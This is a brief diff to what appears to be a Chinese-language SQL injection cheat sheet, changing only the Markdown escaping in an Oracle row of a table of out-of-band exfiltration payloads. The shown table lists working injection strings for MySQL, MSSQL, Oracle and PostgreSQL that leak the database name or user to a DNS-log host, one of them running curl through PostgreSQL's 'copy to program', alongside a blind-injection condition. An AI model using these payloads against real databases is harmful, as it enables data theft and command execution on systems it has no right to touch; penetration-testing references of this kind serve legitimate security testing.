@@ -93,7 +93,7 @@ and ascii(substr((select database()),1,1))>100
 |---|---|
 | MySQL | `load_file(concat('\\\\',(select database()),'.dnslog.xxx\\a'))` |
 | MSSQL | `exec master..xp_dirtree '\\dnslog.xxx\a'` |
-| Oracle | `UTL_HTTP.request('http://dnslog.xxx/'||(select user from dual))` |
+| Oracle | `UTL_HTTP.request('http://dnslog.xxx/'\|\|(select user from dual))` |
 | PostgreSQL | `copy (select '') to program 'curl http://dnslog.xxx/'` |
 | Java 应用 | 走 `jndi-injection-test.md` 的 JNDI 路径 |
 
